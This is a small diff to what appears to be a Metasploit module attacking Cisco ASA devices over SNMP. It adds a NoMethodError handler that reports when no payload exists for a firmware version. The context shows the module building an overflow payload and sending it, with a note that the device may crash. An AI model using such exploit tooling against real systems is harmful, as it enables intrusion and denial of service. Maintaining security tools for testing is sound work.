@@ -146,6 +146,7 @@ class MetasploitModule < Msf::Auxiliary
       print_status("Building payload for #{mode}...")
 
       overflow = build_offsets(vers_string, mode)
+
       payload = SNMP::ObjectId.new(overflow)
 
       print_status("Sending SNMP payload...")
@@ -161,6 +162,8 @@ class MetasploitModule < Msf::Auxiliary
 
     rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::UnsupportedVersion
       print_error("SNMP Error, Cisco ASA may have crashed :/")
+    rescue ::NoMethodError
+      print_error("Error: No payload available for version #{vers_string}")
     rescue ::Interrupt
       raise $!
     rescue ::Exception => e
